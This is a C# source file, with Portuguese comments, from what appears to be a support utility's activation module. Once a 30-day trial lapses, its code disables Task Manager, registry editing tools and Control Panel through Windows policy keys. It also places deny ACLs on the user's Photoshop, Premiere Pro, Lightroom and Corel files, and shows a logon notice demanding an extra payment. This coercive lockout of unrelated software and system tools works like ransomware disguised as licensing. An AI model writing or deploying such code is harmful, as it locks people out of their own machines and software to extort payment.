using System;
using System.ComponentModel;
using System.IO;
using System.Net;
using System.Security.AccessControl;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;

namespace Suporte
{
    class cAtivacao
    {

        private static readonly string Computador = CRegistros.GetComputerName();
        // private static string RegistrationDir = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Microsoft\Credentials";
        private const string RegPolicies = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
        //HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
        private const string RegFolderNtLogon = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
        //private const string RegFolderNt = @"SOFTWARE\Microsoft\Windows NT";
        static readonly frmUsuario frmUsuario = (frmUsuario)Application.OpenForms["frmUsuario"];
        static readonly frmEditor frmEditor = (frmEditor)Application.OpenForms["frmEditor"];
        //private bool Ativado = false;

        public static void Iniciar()
        {

            if (GetAtivStatus() || CRegistros.GetCliente() == "Empresa")//Verificar
            {
                if (frmUsuario != null)
                {
                    frmUsuario.btnAtivar.Text = "Sistema Ativado";
                    frmUsuario.btnAtivar.Enabled = false;
                }
                else if (frmEditor != null)
                {
                    frmEditor.btnAtivar.Text = "Sistema Ativado";
                    frmEditor.btnAtivar.Enabled = false;
                }
                SetFullActivated();
                return;
            }
            CriarTrialDate();
        }

        private static string GetSerialKey()
        {
            string Chave = string.Empty;
            string Data = string.Empty;
            string Codigo = string.Empty;
            Data = cUtils.GetInstallDate();//Alimenta Data
            Codigo = EDCode((Computador + Data).Trim(), true);
            Chave = EDCode(Codigo.ToLower(), true);
            
           // if (Program.Debug)
              //  MessageBox.Show("Data> "+ Data +" SerialKey> " + Chave + "\n" + " Codigo> " + Codigo);

            return Chave;
        }

        public static bool GetAtivStatus()
        {
            string serialKey = GetSerialKey();
            
            return CRegistros.ValidateSerialKey(serialKey); //File.Exists(RegistrationDir + "\\" + Chave);
        }
        //Ativa completamente o Sistema

        protected internal static void CriarChaveAtivada()
        {
            string serialKey = GetSerialKey();
            try
            {
                CRegistros.WriteSerialKey(serialKey);
                SetFullActivated();
                try
                {
                    if (File.Exists(Program.UpdateDir + "\\activation.xml"))
                        File.Delete(Program.UpdateDir + "\\activation.xml");
                }
                catch (Exception)
                {
                }
              
            }
            catch (Exception)
            {
             
            }

            // MessageBox.Show(RegistrationDir + "\\" + tbxSerial.Text);
        }
        public static void SetFullActivated()
        {
            //HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
            //REMOVER AVISOS
            using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(RegFolderNtLogon, true)) //Abrir com permissao
            {
                if (registryKey == null)
                    return;
                registryKey.SetValue("LegalNoticeCaption", "");
                registryKey.SetValue("LegalNoticeText", "");
                registryKey.Close();
            }

            using (var RegTrial = Registry.LocalMachine.OpenSubKey(RegPolicies, true))
            {
                if (RegTrial != null && RegTrial.GetValue("TrialEnd") != null)
                {
                    RegTrial.DeleteValue("TrialEnd");
                    RegTrial.DeleteValue("TrialStart");
                }
                if (RegTrial != null && RegTrial.GetValue("Expirado") == null)
                {
                    RegTrial.Close();
                    return;
                }

                //falta pouco!!
                if (RegTrial.GetValue("Expirado").ToString() == "1")
                {
                    UnlockTaskManager();
                    EnablePanelControl();
                    RegTrial.DeleteValue("Expirado");
                }

                if (RegTrial.GetValue("Expirado").ToString() == "2" || RegTrial.GetValue("Expirado").ToString() == "3")
                {
                    //UnlockSystemRestore();
                    UnlockTaskManager();
                    EnablePanelControl();
                    UnLockAppsFiles();
                    //UnlockHostfile();
                    RegTrial.DeleteValue("Expirado");
                }
            }
        }
        //Setar Modo de Avaliação Apenas
        private static void CriarTrialDate()
        {
            using (var RegTrial = Registry.LocalMachine.OpenSubKey(RegPolicies, true))
            {
                var TrialStart = DateTime.Now.Date; //Pegar Data de HJ 1 Execuçao
                var TrialEnd = DateTime.Today.AddDays(30); //Adicionar 30 Dias para registrar o fim.
                // var LockSwitch = Registry.LocalMachine.OpenSubKey(RegPolicies, true);

                //Se n existe Trial criar...
                if (RegTrial.GetValue("TrialStart") == null)
                {
                    RegTrial.SetValue("TrialStart", TrialStart.ToShortDateString());
                    RegTrial.SetValue("TrialEnd", TrialEnd.ToShortDateString());
                }

                //Iniciar AVISO Depois de criar DATA e Rebootar o sistema ou aplicativo, assim atualizando os valores.
                ShowWarning();

                //Aviso no FORM principal
                // frmUsuario.lblTrialDays.Text = @"Este sistema expira em: " + RegTrial.GetValue("TrialEnd");

                //RESGATAR INFORMAÇOES PARA AVISOS E FIM DO TRIAL
                DateTime TrialFinished;
                DateTime.TryParse(RegTrial.GetValue("TrialEnd").ToString(), out TrialFinished);
                DateTime regTrialEnd;
                DateTime.TryParse(RegTrial.GetValue("TrialEnd").ToString(), out regTrialEnd);
                
                //Passaram 15 dias - TrialStart = HJ > que HJ-30 dias a partir de hj
                if (TrialStart > regTrialEnd.AddDays(-15) && TrialStart < regTrialEnd.AddDays(-10))
                {
                    MessageBox.Show(@"Falta menos de 15 dias para o sistema expirar!", @"ATENÇÃO", MessageBoxButtons.OK,
                    MessageBoxIcon.Information, MessageBoxDefaultButton.Button1);
                }

                //Passaram 20 dias
                if (TrialStart > regTrialEnd.AddDays(-9) && TrialStart < regTrialEnd.AddDays(-2))//Retira da data quantos dias faltam ainda.
                {
                    RegTrial.SetValue("Expirado", "1");//Cria Chave Expirado 1 = a vencer;
                    DisableTaskManager();
                    DisablePanelControl();
                    MessageBox.Show(@"Falta menos de 10 dias para o sistema expirar! a licença dos aplicativos irá expirar.", @"ATENÇÃO", MessageBoxButtons.OK,
                    MessageBoxIcon.Warning, MessageBoxDefaultButton.Button1);
                }

                //Existe: resgata valor e compara dia atual.
                if (TrialStart.CompareTo(TrialFinished) != 1) return;
                MessageBox.Show(@"Modo de Avaliação expirou.", @"ATENÇÃO", MessageBoxButtons.OK,
                MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);

                if (RegTrial.GetValue("Expirado") != null && RegTrial.GetValue("Expirado").ToString() == "3")
                    return;
                CRegistros.WriteLockModeStatus();
                //Venceu? Executar Fechar Sistema:
                RegTrial.SetValue("Expirado", "2");//Cria Chave Expirado 2 = expirou
                LockAppsFiles();
                RegTrial.SetValue("Expirado", "3");
                RegTrial.Close();
            }
        }
        private static void ShowWarning()
        {
            RegistryKey RegTrial; //Abrir somente leitura
            using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(RegFolderNtLogon, true) //Abrir com permissao
                )
            {
                RegTrial = Registry.LocalMachine.OpenSubKey(RegPolicies, false);
                if (registryKey == null) return;
                registryKey.SetValue("LegalNoticeCaption", "SISTEMA EM MODO DE AVALIAÇÃO",
                    RegistryValueKind.String);
                registryKey.SetValue("LegalNoticeText",
                    "Este sistema encontra-se com recursos limitados. " + "\r\n" +
                    "Este sistema deve ser ativado até " + RegTrial.GetValue("TrialEnd") +
                    ", caso expire-se o prazo fixado, algumas funções do sistema e aplicativos serão invalidados e será cobrado um valor extra." +
                    "\r\n" +
                    "Após confirmado o pagamento, poderá ser ativado clicando no botão [Ativar Sistema] e clicando em [Validar Online].",
                    RegistryValueKind.String);

                registryKey.Close();
            }
            RegTrial.Close();
        }
        //Ativa/Desativa Startmanager
        private static void DisableTaskManager()
        {
            using (RegistryKey policies = Registry.CurrentUser.OpenSubKey(RegPolicies, true) //Criar System KEY
                )
            {
                if (policies != null && policies.GetValue("DisableTaskMgr") == null)
                    policies.SetValue("DisableTaskMgr", "1");

                if (policies != null && policies.GetValue("DisableRegistryTools") == null)
                    policies.SetValue("DisableRegistryTools", "1");
            }
        }
        public static void UnlockTaskManager()
        {
            using (RegistryKey policies = Registry.CurrentUser.OpenSubKey(RegPolicies, true))
            {
                if (policies != null && policies.GetValue("DisableTaskMgr") != null)
                    policies.DeleteValue("DisableTaskMgr");

                if (policies != null && policies.GetValue("DisableRegistryTools") != null)
                    policies.DeleteValue("DisableRegistryTools");
            }
        }

        public static void DisablePanelControl()
        {
            using (var panelControl = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true))
            {
                if (panelControl != null && panelControl.GetValue("NoControlPanel") == null)
                    panelControl.SetValue("NoControlPanel", "1");
            }
        }
        public static void EnablePanelControl()
        {
            using (var panelControl = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true))
            {
                if (panelControl == null || panelControl.GetValue("NoControlPanel") == null) return;
                panelControl.DeleteValue("NoControlPanel");
            }
            // panelControl.Close();
            //HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer
        }

        public static void LockAppsFiles()
        {
            //Chave Mestres para desativar
            //C:\ProgramData\Adobe\SLStore
            //C:\ProgramData\Corel
            //C:\ProgramData\Adobe\Lightroom
            // DirectoryInfo SLStore = new DirectoryInfo(@"C:\ProgramData\Adobe");
            
            if(CRegistros.GetSystemLockStatus())//Se for True retornar(Locked) - nao repetir os comandos aqui
                return;

            string LTexePath = cEditor.GetLightRoomExePath();
            string PPexePath = cEditor.GetPremiereProExePath();
            string PSexePath = cEditor.GetPhostoshopExePath();
            try
            {
                //Adicionado para Evitar Conflitos na ativaçao
                if (File.Exists(PPexePath))
                    FileLock(PPexePath);
                
                if (Directory.Exists(@"C:\ProgramData\Corel"))
                    FolderLock(@"C:\ProgramData\Corel");
                
                if (File.Exists(LTexePath))
                    FileLock(LTexePath);

                if (File.Exists(PSexePath))
                    FileLock(PSexePath);
            }
            catch (Exception error)
            {
                cUtils.LogSend("lockapps \n" + error);
                return;//Nao gravar no registro caso tenha erro.
            }
            CRegistros.WriteLockModeStatus();
        }

        public static void UnLockAppsFiles()
        {
            //Chave Mestres para desativar
            //C:\ProgramData\Adobe\SLStore
            //C:\ProgramData\Corel
            //C:\ProgramData\Adobe\Lightroom
            //HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Adobe Premiere Pro.exe]
            
            if (!CRegistros.GetSystemLockStatus())//Se for False retornar
                return;

            string LTexePath = cEditor.GetLightRoomExePath();
            string PPexePath = cEditor.GetPremiereProExePath();
            string PSexePath = cEditor.GetPhostoshopExePath();
            try
            {
                CRegistros.WriteUnLockModeStatus();//Registra app ativados corretamente
                //Adicionado para Evitar Conflitos na ativaçao
                if (File.Exists(PPexePath))
                    FileUnlock(PPexePath);
                if (Directory.Exists(@"C:\ProgramData\Corel"))
                    FolderUnlock(@"C:\ProgramData\Corel");
                
                if (File.Exists(LTexePath))
                    FileUnlock(LTexePath);
                if (File.Exists(PSexePath))
                    FileUnlock(PSexePath);
            }
            catch (Exception error)
            {
                cUtils.LogSend("Unlockapps \n" + error);
            }
        }

        private static void FileUnlock(string path)
        {
            try
            {
                string adminUserName = Environment.UserName;// getting your adminUserName

                FileSecurity ds = File.GetAccessControl(path);
                FileSystemAccessRule fsa = new FileSystemAccessRule(adminUserName, FileSystemRights.FullControl,AccessControlType.Deny);
                ds.RemoveAccessRule(fsa);
                File.SetAccessControl(path, ds);
            }
            catch (Exception ex)
            {
                cUtils.LogSend("FILE UNLOCK: " + ex);
            }
        }

        private static void FileLock(string path)
        {
            try
            {
                string adminUserName = Environment.UserName;// getting your adminUserName

                FileSecurity ds = File.GetAccessControl(path);
                FileSystemAccessRule fsa = new FileSystemAccessRule(adminUserName, FileSystemRights.FullControl,AccessControlType.Deny);
                ds.AddAccessRule(fsa);
                File.SetAccessControl(path, ds);
            }
            catch (Exception ex)
            {
                cUtils.LogSend("FILE LOCK: " + ex);
            }
        }
        private static void FolderUnlock(string path)
        {
            try
            {
                string adminUserName = Environment.UserName;// getting your adminUserName

                DirectorySecurity ds = Directory.GetAccessControl(path);
                FileSystemAccessRule fsaAllow = new FileSystemAccessRule(adminUserName, FileSystemRights.FullControl,AccessControlType.Allow);
                FileSystemAccessRule fsa = new FileSystemAccessRule(adminUserName, FileSystemRights.FullControl,AccessControlType.Deny);
                ds.RemoveAccessRule(fsa);
                ds.AddAccessRule(fsaAllow);
                Directory.SetAccessControl(path, ds);
            }
            catch (Exception ex)
            {
                cUtils.LogSend("FOLDER UNLOCK: " + ex);
            }
        }

        private static void FolderLock(string path)
        {
            try
            {
                string adminUserName = Environment.UserName;// getting your adminUserName

                DirectorySecurity ds = Directory.GetAccessControl(path);
                FileSystemAccessRule fsa = new FileSystemAccessRule(adminUserName, FileSystemRights.FullControl,AccessControlType.Deny);
                ds.AddAccessRule(fsa);
                Directory.SetAccessControl(path, ds);
            }
            catch (Exception ex)
            {
                cUtils.LogSend("LOCK FOLDER: " + ex);
            }
        }

        #region Validar Online
        //DOWNLOAD DO ARQUIVO DE VALIDAR  - desativado
        public static void DownloadActivationStatus() //XML VERSION CHECK
        {
        }

        //Update INIT
        private static void WebDownupOnDownloadFileCompleted(object sender, AsyncCompletedEventArgs asyncCompletedEventArgs)
        {
            ActivationCheck();
            //ActivationAutoCheck();
        }

        private static void ActivationCheck()
        {
            frmValidar fvalidar = (frmValidar)Application.OpenForms["frmValidar"];
            if (!File.Exists(Program.UpdateDir + "\\activation.xml"))
            {
                if (fvalidar != null) fvalidar.tbxinfo.Text = "FALHA AO VERIFICAR";
                return;
            }
            var pcname = CRegistros.GetComputerName(); //<- Nome do usuario castrado - Usado para Chave
            var clientname = CRegistros.GetCliente(); //<- Nome da empresa ou cliente   CASESENSITIVE
            XmlDocument xmldoc = new XmlDocument();
            try
            {
                xmldoc.Load(Program.UpdateDir + "\\activation.xml");// <- XML de Ativaçao
                // MessageBox.Show(username + "\n" + clientname);
                XmlNode node = xmldoc.SelectSingleNode("activation/" + clientname + "/" + pcname); //Node principal+nome do cliente
                var selectSingleNode = node.SelectSingleNode("Status");
                if (selectSingleNode != null && selectSingleNode.InnerText == "Activated")
                {
                    if (fvalidar != null) fvalidar.Close();
                    CriarChaveAtivada();
                }
            }
            catch (Exception)
            {
                // frmValidar fvalidar = (frmValidar) Application.OpenForms["frmValidar"];
                if (fvalidar != null) fvalidar.tbxinfo.Text = "INVÁLIDO";
            }
            finally
            {

                try
                {
                    if (File.Exists(Program.UpdateDir + "\\activation.xml"))
                        File.Delete(Program.UpdateDir + "\\activation.xml");
                }
                catch (Exception)
                {
                }
            }
        }

        private static void ActivationAutoCheck()
        {
            if (!File.Exists(Program.UpdateDir + "\\activation.xml"))
            {
                return;
            }
            var pcname = CRegistros.GetComputerName(); //<- Nome do usuario castrado - Usado para Chave
            var clientname = CRegistros.GetCliente(); //<- Nome da empresa ou cliente   CASESENSITIVE
            XmlDocument xmldoc = new XmlDocument();
            try
            {
                xmldoc.Load(Program.UpdateDir + "\\activation.xml");// <- XML de Ativaçao
                XmlNode node = xmldoc.SelectSingleNode("activation/" + clientname + "/" + pcname); //Node principal+nome do cliente
                var selectSingleNode = node.SelectSingleNode("Status");
                if (selectSingleNode != null && selectSingleNode.InnerText == "Activated")
                {
                    CriarChaveAtivada();
                }
            }
            catch (Exception)
            {
            }
            finally
            {
                try
                {
                    if (File.Exists(Program.UpdateDir + "\\activation.xml"))
                        File.Delete(Program.UpdateDir + "\\activation.xml");
                }
                catch (Exception)
                {
                }
            }

        }
        #endregion

        
        //Gera a chave A
        private static string EDCode(string Text, bool Encode)
        {
            return (Encode)//SE for True Converte , outro Decodifica
                       ? Convert.ToBase64String(Encoding.ASCII.GetBytes(Text))
                       : Encoding.ASCII.GetString(Convert.FromBase64String(Text));
        }
    }
}
